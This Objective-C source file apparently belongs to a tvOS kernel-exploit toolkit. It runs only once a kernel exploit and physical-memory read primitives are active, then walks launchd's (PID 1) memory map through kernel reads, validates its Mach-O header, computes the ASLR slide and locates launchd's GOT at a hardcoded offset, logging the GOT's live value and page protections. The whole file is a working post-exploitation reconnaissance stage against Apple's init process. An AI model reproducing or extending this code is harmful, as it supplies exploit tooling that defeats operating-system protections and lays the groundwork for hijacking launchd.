#import "dt_build727r_launchd_contract_telemetry.h"
#import "dt_macho_build_version.h"
#import "dt_baked_offsets.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit_gate.h"
#import "primitives.h"
#import "kernel.h"
#import "info.h"

#import <mach-o/loader.h>
#import <stdarg.h>
#import <stdbool.h>
#import <stdint.h>
#import <string.h>

#ifndef DT_BUILD_NUM
#define DT_BUILD_NUM 0
#endif

enum {
    kDT727RStaticImageBase   = 0x100000000ULL,
    kDT727RGotDelta          = 0x65018ULL,
    kDT727RMapEnumLimit      = 512,
    kDT727RLcParseMax        = 64,
    kDT727RMinosExpected     = DT_PACK_BUILD_VERSION(16u, 5u, 0u),
    kDT727RPlatformTvos      = 3u,
    kDT727RMaxDetailMagic    = 16,
};

typedef struct {
    bool have_magic;
    uint32_t magic;
    uint32_t cputype;
    uint32_t cpusubtype;
    uint32_t filetype;
    uint32_t ncmds;
    uint32_t sizeofcmds;
    uint32_t flags;
    bool mh_pie;
    bool have_build_version;
    uint32_t platform;
    uint32_t minos;
    uint32_t sdk;
    bool have_lc_main;
    uint64_t lc_main_entryoff;
    bool have_text;
    uint64_t text_vmaddr;
    uint64_t text_vmsize;
    uint64_t text_fileoff;
    uint64_t text_filesize;
    uint32_t text_maxprot;
    uint32_t text_initprot;
} dt727r_macho_info_t;

typedef struct {
    int parse_rc;
    const char *stop_reason;
    const char *header_state;
    int header_read_rc;
    size_t header_bytes_read;
    uint64_t lc_region_va;
    uint32_t lc_bytes_requested;
    size_t lc_bytes_read;
    uint32_t lc_processed;
    uint32_t parse_final_offset;
} dt727r_parse_telemetry_t;

static void dt727r_log(void (^log)(NSString *line), NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [[DTRunLogger shared] log:msg];
    if (log)
        log(msg);
}

static void dt727r_stage(const char *marker)
{
    [[DTRunLogger shared] logStage:[NSString stringWithUTF8String:marker]];
}

static bool dt727r_kva_canonical(uint64_t kva)
{
    return kva >= 0xfffff00000000000ULL;
}

static bool dt727r_user_ptr_plausible(uint64_t ua)
{
    if (!ua || ua >= 0xfffff00000000000ULL)
        return false;
    return true;
}

static int dt727r_physrw_ready(void)
{
    return dt_phys716_phys_ready()
        && gPrimitives.physreadbuf != NULL
        && gPrimitives.vtophys != NULL;
}

static int dt727r_read_proc(uint64_t proc, uint64_t ua, void *buf, size_t len)
{
    if (!proc || !buf || !len)
        return -1;
    if (!dt727r_user_ptr_plausible(ua))
        return -2;
    return proc_vreadbuf(proc, (const void *)(uintptr_t)ua, buf, len);
}

static bool dt727r_lc_fits(uint32_t lc_off, uint32_t lc_size, uint32_t sizeofcmds)
{
    if (lc_size < sizeof(struct load_command))
        return false;
    if (lc_off > sizeofcmds || lc_size > sizeofcmds - lc_off)
        return false;
    return true;
}

static NSString *dt727r_minos_decoded(uint32_t minos)
{
    return [NSString stringWithFormat:@"%u.%u.%u", (minos >> 16) & 0xffffu,
        (minos >> 8) & 0xffu, minos & 0xffu];
}

static const char *dt727r_parse_stop_reason_for_rc(int rc)
{
    switch (rc) {
    case 0: return "NONE";
    case -2: return "HEADER_READ_FAIL";
    case -3: return "INVALID_NCMDS";
    case -4: return "INVALID_SIZEOFCMDS";
    case -5: return "SIZEOFCMDS_LIMIT";
    case -6: return "SIZEOFCMDS_LIMIT";
    case -7: return "LOAD_COMMAND_REGION_READ_FAIL";
    case -8: return "CMDSIZE_TOO_SMALL";
    case -9: return "COMMAND_OUT_OF_BOUNDS";
    default: return "OTHER";
    }
}

static bool dt727r_macho_passes_contract(const dt727r_macho_info_t *mi)
{
    if (!mi || !mi->have_magic)
        return false;
    if (mi->cputype != CPU_TYPE_ARM64)
        return false;
    if (mi->cpusubtype != CPU_SUBTYPE_ARM64_ALL)
        return false;
    if (mi->filetype != MH_EXECUTE)
        return false;
    if (!mi->mh_pie)
        return false;
    if (!mi->have_build_version)
        return false;
    if (mi->platform != kDT727RPlatformTvos)
        return false;
    if (mi->minos != kDT727RMinosExpected || mi->sdk != kDT727RMinosExpected)
        return false;
    if (!mi->have_lc_main)
        return false;
    if (!mi->have_text)
        return false;
    if (mi->text_vmaddr != kDT727RStaticImageBase)
        return false;
    if (mi->text_fileoff != 0)
        return false;
    if ((mi->text_initprot & (VM_PROT_READ | VM_PROT_EXECUTE)) != (VM_PROT_READ | VM_PROT_EXECUTE))
        return false;
    return true;
}

static int dt727r_parse_macho(uint64_t proc, uint64_t base, dt727r_macho_info_t *out,
    dt727r_parse_telemetry_t *tel)
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));
    if (tel)
        memset(tel, 0, sizeof(*tel));

    struct mach_header_64 mh = {0};
    int hdr_rc = dt727r_read_proc(proc, base, &mh, sizeof(mh));
    if (tel) {
        tel->header_read_rc = hdr_rc;
        tel->header_bytes_read = (hdr_rc == 0) ? sizeof(mh) : 0;
        tel->lc_region_va = base + sizeof(mh);
    }
    if (hdr_rc != 0)
        return -2;

    out->magic = mh.magic;
    out->have_magic = (mh.magic == MH_MAGIC_64);
    out->cputype = mh.cputype;
    out->cpusubtype = mh.cpusubtype;
    out->filetype = mh.filetype;
    out->ncmds = mh.ncmds;
    out->sizeofcmds = mh.sizeofcmds;
    out->flags = mh.flags;
    out->mh_pie = ((mh.flags & MH_PIE) != 0);

    if (mh.ncmds == 0 || mh.ncmds > kDT727RLcParseMax)
        return -3;
    if (mh.sizeofcmds < mh.ncmds * sizeof(struct load_command))
        return -4;
    if (mh.sizeofcmds > 16 * 1024)
        return -5;

    uint8_t lcbuf[16 * 1024];
    if (mh.sizeofcmds > sizeof(lcbuf))
        return -6;

    if (tel)
        tel->lc_bytes_requested = mh.sizeofcmds;
    int lc_rc = dt727r_read_proc(proc, base + sizeof(mh), lcbuf, mh.sizeofcmds);
    if (tel)
        tel->lc_bytes_read = (lc_rc == 0) ? mh.sizeofcmds : 0;
    if (lc_rc != 0)
        return -7;

    uint32_t off = 0;
    for (uint32_t i = 0; i < mh.ncmds; i++) {
        if (!dt727r_lc_fits(off, ((struct load_command *)(lcbuf + off))->cmdsize, mh.sizeofcmds))
            return -8;
        struct load_command *lc = (struct load_command *)(lcbuf + off);
        if (lc->cmdsize < sizeof(struct load_command))
            return -8;
        if (lc->cmd == LC_BUILD_VERSION) {
            if (lc->cmdsize < sizeof(struct build_version_command))
                return -8;
            struct build_version_command *bv = (struct build_version_command *)lc;
            out->have_build_version = true;
            out->platform = bv->platform;
            out->minos = bv->minos;
            out->sdk = bv->sdk;
        } else if (lc->cmd == LC_MAIN) {
            if (lc->cmdsize < sizeof(struct entry_point_command))
                return -8;
            struct entry_point_command *ep = (struct entry_point_command *)lc;
            out->have_lc_main = true;
            out->lc_main_entryoff = ep->entryoff;
        } else if (lc->cmd == LC_SEGMENT_64) {
            if (lc->cmdsize < sizeof(struct segment_command_64))
                return -8;
            struct segment_command_64 *sg = (struct segment_command_64 *)lc;
            if (strncmp(sg->segname, SEG_TEXT, sizeof(sg->segname)) == 0) {
                out->have_text = true;
                out->text_vmaddr = sg->vmaddr;
                out->text_vmsize = sg->vmsize;
                out->text_fileoff = sg->fileoff;
                out->text_filesize = sg->filesize;
                out->text_maxprot = sg->maxprot;
                out->text_initprot = sg->initprot;
            }
        }
        off += lc->cmdsize;
        if (off > mh.sizeofcmds)
            return -9;
        if (tel)
            tel->lc_processed = i + 1;
    }
    if (tel)
        tel->parse_final_offset = off;
    return 0;
}

typedef struct {
    const char *name;
    bool pass;
} dt727r_clause_t;

static void dt727r_eval_contract_clauses(const dt727r_macho_info_t *mi, dt727r_clause_t *clauses,
    size_t *nclauses_out, const char **first_fail_out, bool *contract_pass_out)
{
    size_t idx = 0;
    const char *first_fail = "NONE";

#define ADD_CLAUSE(label, expr) do { \
    bool ok = (expr); \
    clauses[idx].name = (label); \
    clauses[idx].pass = ok; \
    if (!ok && !strcmp(first_fail, "NONE")) first_fail = (label); \
    idx++; \
} while (0)

    ADD_CLAUSE("MAGIC", mi && mi->have_magic);
    ADD_CLAUSE("CPUTYPE", mi && mi->cputype == CPU_TYPE_ARM64);
    ADD_CLAUSE("CPUSUBTYPE", mi && mi->cpusubtype == CPU_SUBTYPE_ARM64_ALL);
    ADD_CLAUSE("FILETYPE", mi && mi->filetype == MH_EXECUTE);
    ADD_CLAUSE("MH_PIE", mi && mi->mh_pie);
    ADD_CLAUSE("BUILD_VERSION_PRESENT", mi && mi->have_build_version);
    ADD_CLAUSE("PLATFORM", mi && mi->have_build_version && mi->platform == kDT727RPlatformTvos);
    ADD_CLAUSE("MINOS", mi && mi->have_build_version && mi->minos == kDT727RMinosExpected);
    ADD_CLAUSE("SDK", mi && mi->have_build_version && mi->sdk == kDT727RMinosExpected);
    ADD_CLAUSE("LC_MAIN", mi && mi->have_lc_main);
    ADD_CLAUSE("TEXT_PRESENT", mi && mi->have_text);
    ADD_CLAUSE("TEXT_VMADDR", mi && mi->have_text && mi->text_vmaddr == kDT727RStaticImageBase);
    ADD_CLAUSE("TEXT_FILEOFF", mi && mi->have_text && mi->text_fileoff == 0);
    ADD_CLAUSE("TEXT_MAXPROT", mi && mi->have_text
        && ((mi->text_maxprot & (VM_PROT_READ | VM_PROT_EXECUTE)) == (VM_PROT_READ | VM_PROT_EXECUTE)));
    ADD_CLAUSE("TEXT_INITPROT", mi && mi->have_text
        && ((mi->text_initprot & (VM_PROT_READ | VM_PROT_EXECUTE)) == (VM_PROT_READ | VM_PROT_EXECUTE)));

#undef ADD_CLAUSE

    if (nclauses_out)
        *nclauses_out = idx;
    if (first_fail_out)
        *first_fail_out = first_fail;
    if (contract_pass_out)
        *contract_pass_out = dt727r_macho_passes_contract(mi);
}

static const char *dt727r_header_state_for_parse(int parse_rc, const dt727r_macho_info_t *mi)
{
    if (parse_rc == -2)
        return "READ_FAIL";
    if (parse_rc == -3)
        return "NCMDS_INVALID";
    if (parse_rc == -4 || parse_rc == -6)
        return "SIZEOFCMDS_INVALID";
    if (parse_rc == -5)
        return "OVERFLOW";
    if (parse_rc != 0)
        return "OVERFLOW";
    if (!mi->have_magic)
        return "BAD_MAGIC";
    return "PASS";
}

static void dt727r_log_contract_clauses(void (^log)(NSString *line), const dt727r_clause_t *clauses,
    size_t n, const char *first_fail, bool contract_pass)
{
    for (size_t i = 0; i < n; i++) {
        dt727r_log(log, @"[*] BUILD102727R_CONTRACT_%s=%s", clauses[i].name,
            clauses[i].pass ? "PASS" : "FAIL");
    }
    dt727r_log(log, @"[*] BUILD102727R_FIRST_FAILING_CLAUSE=%s", first_fail);
    dt727r_log(log, @"[*] BUILD102727R_CONTRACT_RESULT=%s", contract_pass ? "PASS" : "FAIL");
}

static void dt727r_log_extracted_values(void (^log)(NSString *line), const dt727r_macho_info_t *mi)
{
    dt727r_log(log, @"[*] BUILD102727R_BUILD_VERSION_SEEN=%@", mi->have_build_version ? @"YES" : @"NO");
    dt727r_log(log, @"[*] BUILD102727R_BUILD_VERSION_PLATFORM=%u", mi->platform);
    dt727r_log(log, @"[*] BUILD102727R_BUILD_VERSION_MINOS_RAW=0x%x", mi->minos);
    dt727r_log(log, @"[*] BUILD102727R_BUILD_VERSION_MINOS_DECODED=%@", dt727r_minos_decoded(mi->minos));
    dt727r_log(log, @"[*] BUILD102727R_BUILD_VERSION_SDK=0x%x", mi->sdk);
    dt727r_log(log, @"[*] BUILD102727R_LC_MAIN_SEEN=%@", mi->have_lc_main ? @"YES" : @"NO");
    dt727r_log(log, @"[*] BUILD102727R_LC_MAIN_ENTRYOFF=0x%llx", (unsigned long long)mi->lc_main_entryoff);
    dt727r_log(log, @"[*] BUILD102727R_TEXT_SEEN=%@", mi->have_text ? @"YES" : @"NO");
    dt727r_log(log, @"[*] BUILD102727R_TEXT_VMADDR=0x%llx", (unsigned long long)mi->text_vmaddr);
    dt727r_log(log, @"[*] BUILD102727R_TEXT_VMSIZE=0x%llx", (unsigned long long)mi->text_vmsize);
    dt727r_log(log, @"[*] BUILD102727R_TEXT_FILEOFF=0x%llx", (unsigned long long)mi->text_fileoff);
    dt727r_log(log, @"[*] BUILD102727R_TEXT_FILESIZE=0x%llx", (unsigned long long)mi->text_filesize);
    dt727r_log(log, @"[*] BUILD102727R_TEXT_MAXPROT=0x%x", mi->text_maxprot);
    dt727r_log(log, @"[*] BUILD102727R_TEXT_INITPROT=0x%x", mi->text_initprot);
}

static void dt727r_log_detail_candidate(void (^log)(NSString *line), unsigned magic_index,
    uint64_t entry_kva, uint64_t start, uint64_t end, int magic_rc, uint32_t magic_val,
    const dt727r_macho_info_t *mi, const dt727r_parse_telemetry_t *tel, int parse_rc)
{
    dt727r_log(log, @"[*] BUILD102727R_MAGIC_MATCH_INDEX=%u", magic_index);
    dt727r_log(log, @"[*] BUILD102727R_MAGIC_MATCH_ENTRY=0x%llx", (unsigned long long)entry_kva);
    dt727r_log(log, @"[*] BUILD102727R_MAGIC_MATCH_START=0x%llx", (unsigned long long)start);
    dt727r_log(log, @"[*] BUILD102727R_MAGIC_MATCH_END=0x%llx", (unsigned long long)end);
    dt727r_log(log, @"[*] BUILD102727R_MAGIC_READ_RC=%d", magic_rc);
    dt727r_log(log, @"[*] BUILD102727R_MAGIC_VALUE=0x%x", magic_val);

    if (tel) {
        dt727r_log(log, @"[*] BUILD102727R_HEADER_READ_RC=%d", tel->header_read_rc);
        dt727r_log(log, @"[*] BUILD102727R_HEADER_BYTES_READ=%zu", tel->header_bytes_read);
    }
    if (mi) {
        dt727r_log(log, @"[*] BUILD102727R_HEADER_MAGIC=0x%x", mi->magic);
        dt727r_log(log, @"[*] BUILD102727R_HEADER_CPUTYPE=0x%x", mi->cputype);
        dt727r_log(log, @"[*] BUILD102727R_HEADER_CPUSUBTYPE=0x%x", mi->cpusubtype);
        dt727r_log(log, @"[*] BUILD102727R_HEADER_FILETYPE=%u", mi->filetype);
        dt727r_log(log, @"[*] BUILD102727R_HEADER_NCMDS=%u", mi->ncmds);
        dt727r_log(log, @"[*] BUILD102727R_HEADER_SIZEOFCMDS=%u", mi->sizeofcmds);
        dt727r_log(log, @"[*] BUILD102727R_HEADER_FLAGS=0x%x", mi->flags);
    }

    const char *hdr_state = dt727r_header_state_for_parse(parse_rc, mi);
    dt727r_log(log, @"[*] BUILD102727R_HEADER_STATE=%s", hdr_state);

    dt727r_log(log, @"[*] BUILD102727R_PARSE_RC=%d", parse_rc);
    dt727r_log(log, @"[*] BUILD102727R_PARSE_STOP_REASON=%s", dt727r_parse_stop_reason_for_rc(parse_rc));
    if (tel) {
        dt727r_log(log, @"[*] BUILD102727R_LOAD_COMMAND_REGION_VA=0x%llx",
            (unsigned long long)tel->lc_region_va);
        dt727r_log(log, @"[*] BUILD102727R_LOAD_COMMAND_BYTES_REQUESTED=%u", tel->lc_bytes_requested);
        dt727r_log(log, @"[*] BUILD102727R_LOAD_COMMAND_BYTES_READ=%zu", tel->lc_bytes_read);
        dt727r_log(log, @"[*] BUILD102727R_LOAD_COMMANDS_PROCESSED=%u", tel->lc_processed);
        dt727r_log(log, @"[*] BUILD102727R_PARSE_FINAL_OFFSET=%u", tel->parse_final_offset);
    }

    if (parse_rc == 0 && mi)
        dt727r_log_extracted_values(log, mi);

    dt727r_clause_t clauses[16];
    size_t nclauses = 0;
    const char *first_fail = "NONE";
    bool contract_pass = false;
    if (parse_rc == 0 && mi) {
        dt727r_eval_contract_clauses(mi, clauses, &nclauses, &first_fail, &contract_pass);
        dt727r_log_contract_clauses(log, clauses, nclauses, first_fail, contract_pass);
    }

    const char *candidate_result = "MAGIC_ONLY";
    if (parse_rc == -2)
        candidate_result = "HEADER_READ_FAIL";
    else if (parse_rc != 0)
        candidate_result = "PARSE_FAIL";
    else if (!contract_pass)
        candidate_result = "CONTRACT_FAIL";
    else
        candidate_result = "FULL_ACCEPT";

    dt727r_log(log, @"[*] BUILD102727R_CANDIDATE_RESULT=%s", candidate_result);

    if (contract_pass && mi) {
        uint64_t slide = start - kDT727RStaticImageBase;
        uint64_t got_va = start + kDT727RGotDelta;
        dt727r_log(log, @"[*] BUILD102727R_ACCEPTED_RUNTIME_BASE=0x%llx", (unsigned long long)start);
        dt727r_log(log, @"[*] BUILD102727R_ACCEPTED_SLIDE=0x%llx", (unsigned long long)slide);
        dt727r_log(log, @"[*] BUILD102727R_ACCEPTED_GOT_VA=0x%llx", (unsigned long long)got_va);
    }
}

int dt_build727r_run_readonly_launchd_contract_telemetry(void (^log)(NSString *line),
    NSString **verdictOut)
{
    (void)DT_BUILD_NUM;

    dt727r_stage("BUILD102727R_BEGIN");
    dt727r_stage("BUILD102727R_SCOPE=READ_ONLY_LAUNCHD_MACHO_CONTRACT_REJECTION_TELEMETRY");

    bool phys_ready = dt727r_physrw_ready();
    dt727r_log(log, @"[*] BUILD102727R_PHYSRW_READY=%@", phys_ready ? @"YES" : @"NO");
    if (!phys_ready) {
        dt727r_stage("BUILD102727R_RESULT=PREREQUISITE_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_PREREQUISITE_FAIL";
        return -1;
    }

    if (!dt_kernel_exploit_is_active() || !g_dt_baked_offsets_active) {
        dt727r_stage("BUILD102727R_RESULT=PREREQUISITE_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_PREREQUISITE_FAIL";
        return -2;
    }

    uint64_t proc1 = proc_find(1);
    dt727r_log(log, @"[*] BUILD102727R_PROC1=0x%llx", (unsigned long long)proc1);
    if (!proc1 || !dt727r_kva_canonical(proc1)) {
        dt727r_stage("BUILD102727R_RESULT=PREREQUISITE_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_PREREQUISITE_FAIL";
        return -10;
    }

    uint64_t task1 = proc_task(proc1);
    dt727r_log(log, @"[*] BUILD102727R_TASK1=0x%llx", (unsigned long long)task1);
    if (!task1 || !dt727r_kva_canonical(task1)) {
        dt727r_stage("BUILD102727R_RESULT=PREREQUISITE_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_PREREQUISITE_FAIL";
        return -11;
    }

    uint64_t map1 = kread_ptr(task1 + koffsetof(task, map));
    dt727r_log(log, @"[*] BUILD102727R_MAP1=0x%llx", (unsigned long long)map1);
    if (!map1 || !dt727r_kva_canonical(map1)) {
        dt727r_stage("BUILD102727R_RESULT=PREREQUISITE_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_PREREQUISITE_FAIL";
        return -12;
    }

    uint64_t pmap1 = kread_ptr(map1 + koffsetof(vm_map, pmap));
    dt727r_log(log, @"[*] BUILD102727R_PMAP1=0x%llx", (unsigned long long)pmap1);
    if (!pmap1 || !dt727r_kva_canonical(pmap1)) {
        dt727r_stage("BUILD102727R_RESULT=PREREQUISITE_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_PREREQUISITE_FAIL";
        return -13;
    }

    uint64_t sentinel = map1 + koffsetof(vm_map, hdr);
    uint64_t entry = kread_ptr(map1 + koffsetof(vm_map, hdr) + koffsetof(vm_map_links, next));
    uint64_t seen[kDT727RMapEnumLimit];
    unsigned seen_count = 0;
    unsigned enum_count = 0;
    const char *abort_reason = "NONE";

    unsigned magic_match_total = 0;
    unsigned detail_logged = 0;
    bool saw_magic = false;
    bool saw_header_read_fail = false;
    bool saw_parse_fail = false;
    bool saw_contract_fail = false;
    bool saw_full_accept = false;

    dt727r_stage("BUILD102727R_MAP_ENUM_BEGIN");

    uint64_t runtime_base = 0;
    dt727r_macho_info_t best_mi = {0};

    while (entry != sentinel) {
        if (++enum_count > kDT727RMapEnumLimit) {
            abort_reason = "LIMIT";
            break;
        }
        if (!entry || !dt727r_kva_canonical(entry)) {
            abort_reason = "NULL_ENTRY";
            goto enum_done_fail;
        }
        for (unsigned i = 0; i < seen_count; i++) {
            if (seen[i] == entry) {
                abort_reason = "CYCLE";
                goto enum_done_fail;
            }
        }
        if (seen_count < kDT727RMapEnumLimit)
            seen[seen_count++] = entry;

        uint64_t start = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, min));
        uint64_t end = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, max));
        if (start >= end || !dt727r_user_ptr_plausible(start)) {
            abort_reason = "INVALID_RANGE";
            goto enum_done_fail;
        }

        uint32_t magic_probe = 0;
        int magic_rc = dt727r_read_proc(proc1, start, &magic_probe, sizeof(magic_probe));
        if (magic_rc == 0 && magic_probe == MH_MAGIC_64) {
            saw_magic = true;
            magic_match_total++;

            dt727r_macho_info_t mi = {0};
            dt727r_parse_telemetry_t tel = {0};
            int parse_rc = dt727r_parse_macho(proc1, start, &mi, &tel);

            if (detail_logged < kDT727RMaxDetailMagic) {
                dt727r_log_detail_candidate(log, magic_match_total, entry, start, end, magic_rc,
                    magic_probe, &mi, &tel, parse_rc);
                detail_logged++;
            }

            if (parse_rc == -2)
                saw_header_read_fail = true;
            else if (parse_rc != 0)
                saw_parse_fail = true;
            else if (!dt727r_macho_passes_contract(&mi))
                saw_contract_fail = true;
            else {
                saw_full_accept = true;
                if (!runtime_base || start < runtime_base) {
                    runtime_base = start;
                    best_mi = mi;
                }
            }
        }

        entry = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, next));
    }

    dt727r_log(log, @"[*] BUILD102727R_MAP_ENUM_COUNT=%u", enum_count);
    dt727r_log(log, @"[*] BUILD102727R_MAP_ENUM_ABORT_REASON=%s", abort_reason);
    dt727r_log(log, @"[*] BUILD102727R_MAGIC_MATCH_TOTAL=%u", magic_match_total);
    dt727r_log(log, @"[*] BUILD102727R_DETAIL_CANDIDATES_LOGGED=%u", detail_logged);

    if (strcmp(abort_reason, "NONE") != 0) {
        dt727r_stage("BUILD102727R_RESULT=INCONCLUSIVE");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_MAP_ENUM_ABORT";
        return -20;
    }

    if (!runtime_base) {
        if (!saw_magic) {
            dt727r_stage("BUILD102727R_RESULT=NO_MAGIC_MATCH");
            if (verdictOut)
                *verdictOut = @"BUILD102727R_NO_MAGIC_MATCH";
        } else if (saw_header_read_fail && !saw_parse_fail && !saw_contract_fail) {
            dt727r_stage("BUILD102727R_RESULT=HEADER_READ_FAIL");
            if (verdictOut)
                *verdictOut = @"BUILD102727R_HEADER_READ_FAIL";
        } else if (saw_parse_fail) {
            dt727r_stage("BUILD102727R_RESULT=MACHO_PARSE_FAIL");
            if (verdictOut)
                *verdictOut = @"BUILD102727R_MACHO_PARSE_FAIL";
        } else if (saw_contract_fail) {
            dt727r_stage("BUILD102727R_RESULT=MACHO_CONTRACT_FAIL");
            if (verdictOut)
                *verdictOut = @"BUILD102727R_MACHO_CONTRACT_FAIL";
        } else {
            dt727r_stage("BUILD102727R_RESULT=CANDIDATE_SELECTION_FAIL");
            if (verdictOut)
                *verdictOut = @"BUILD102727R_CANDIDATE_SELECTION_FAIL";
        }
        return -30;
    }

    dt727r_log(log, @"[*] BUILD102727R_BASE_VALIDATION=PASS");
    dt727r_log(log, @"[*] BUILD102727R_RUNTIME_BASE=0x%llx", (unsigned long long)runtime_base);

    uint64_t slide = runtime_base - kDT727RStaticImageBase;
    uint64_t got_runtime = runtime_base + kDT727RGotDelta;
    dt727r_log(log, @"[*] BUILD102727R_GOT_RUNTIME_VA=0x%llx", (unsigned long long)got_runtime);

    uint64_t live_got = 0;
    int got_rc = dt727r_read_proc(proc1, got_runtime, &live_got, sizeof(live_got));
    dt727r_log(log, @"[*] BUILD102727R_GOT_READ_RC=%d", got_rc);
    dt727r_log(log, @"[*] BUILD102727R_GOT_LIVE_VALUE=0x%llx", (unsigned long long)live_got);
    if (got_rc != 0) {
        dt727r_stage("BUILD102727R_RESULT=BASE_PASS_GOT_READ_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_BASE_PASS_GOT_READ_FAIL";
        return -40;
    }

    entry = kread_ptr(map1 + koffsetof(vm_map, hdr) + koffsetof(vm_map_links, next));
    seen_count = 0;
    enum_count = 0;
    uint64_t got_entry = 0;
    uint64_t got_start = 0;
    uint64_t got_end = 0;
    uint64_t got_flags = 0;

    while (entry != sentinel) {
        if (++enum_count > kDT727RMapEnumLimit)
            break;
        if (!entry || !dt727r_kva_canonical(entry))
            break;
        uint64_t estart = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, min));
        uint64_t eend = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, max));
        if (got_runtime >= estart && got_runtime < eend) {
            got_entry = entry;
            got_start = estart;
            got_end = eend;
            got_flags = kread64(entry + koffsetof(vm_map_entry, flags));
            break;
        }
        entry = kread_ptr(entry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, next));
    }

    if (!got_entry) {
        dt727r_log(log, @"[*] BUILD102727R_GOT_ENTRY_FOUND=NO");
        dt727r_stage("BUILD102727R_GOT_ENTRY_QUERY=FAIL");
        dt727r_stage("BUILD102727R_RESULT=BASE_GOT_PASS_ENTRY_QUERY_FAIL");
        if (verdictOut)
            *verdictOut = @"BUILD102727R_BASE_GOT_PASS_ENTRY_QUERY_FAIL";
        return -50;
    }

    uint32_t cur_prot = (uint32_t)((got_flags >> 7) & 0xFu);
    uint32_t max_prot = (uint32_t)((got_flags >> 11) & 0xFu);

    dt727r_log(log, @"[*] BUILD102727R_GOT_ENTRY_FOUND=YES");
    dt727r_log(log, @"[*] BUILD102727R_GOT_ENTRY_FLAGS=0x%llx", (unsigned long long)got_flags);
    dt727r_log(log, @"[*] BUILD102727R_GOT_CURRENT_PROT=%u", cur_prot);
    dt727r_log(log, @"[*] BUILD102727R_GOT_MAX_PROT=%u", max_prot);
    dt727r_stage("BUILD102727R_GOT_ENTRY_QUERY=PASS");
    dt727r_stage("BUILD102727R_RESULT=READ_ONLY_CLOSURE_PASS");
    if (verdictOut)
        *verdictOut = @"BUILD102727R_READ_ONLY_CLOSURE_PASS";
    (void)best_mi;
    (void)saw_full_accept;
    (void)slide;
    (void)got_start;
    (void)got_end;
    return 0;

enum_done_fail:
    dt727r_log(log, @"[*] BUILD102727R_MAP_ENUM_COUNT=%u", enum_count);
    dt727r_log(log, @"[*] BUILD102727R_MAP_ENUM_ABORT_REASON=%s", abort_reason);
    dt727r_stage("BUILD102727R_RESULT=INCONCLUSIVE");
    if (verdictOut)
        *verdictOut = @"BUILD102727R_MAP_ENUM_FAIL";
    return -20;
}
